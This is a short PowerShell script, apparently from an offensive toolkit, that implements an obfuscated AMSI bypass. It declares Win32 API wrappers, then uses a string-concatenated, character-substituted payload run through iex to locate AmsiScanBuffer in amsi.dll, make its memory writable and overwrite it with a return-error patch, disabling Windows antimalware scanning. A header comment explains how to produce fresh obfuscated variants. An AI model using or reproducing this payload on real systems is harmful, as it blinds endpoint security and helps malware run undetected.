# To generate your own bypass, simply use RastaMouse's AMSI bypass, which was effective in late 2019
# and run its Powershell portions through Invoke-Obfuscation

$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

 (('H'+'10'+'L'+'oa'+'dLib'+'rary'+' '+'= [Wi'+'n'+'32]::LoadLib'+'rary('+'UoVamUoV + Uo'+'Vs'+'i.d'+'llUo'+'V)
'+'H1'+'0'+'Address = '+'[Win32]:'+':Ge'+'t'+'ProcA'+'dd'+'r'+'es'+'s'+'('+'H1'+'0'+'Load'+'L'+'i'+'brary'+', U'+'o'+'VA'+'ms'+'iU'+'oV + '+'UoVScanUoV +'+' Uo'+'VB'+'u'+'ffe'+'rUoV'+')
'+'H10p = '+'0
[Win3'+'2]'+'::V'+'irtualPro'+'tect(H10Add'+'ress, [uint32]5, 0'+'x40, [ref]'+'H10p'+')
H'+'10Pa'+'tch = [Byt'+'e[]] (0xB8,'+' 0x57, 0'+'x00'+','+' '+'0x07, 0x80, 0xC3)
'+'[Sys'+'tem'+'.Ru'+'ntime.I'+'n'+'teropServ'+'ices.M'+'ars'+'hal]::Copy('+'H10'+'Patc'+'h, 0, '+'H1'+'0Add'+'res'+'s'+', 6)'+'
') -rePLAcE  ([CHar]85+[CHar]111+[CHar]86),[CHar]34  -CreplaCe  'H10',[CHar]36) | iex
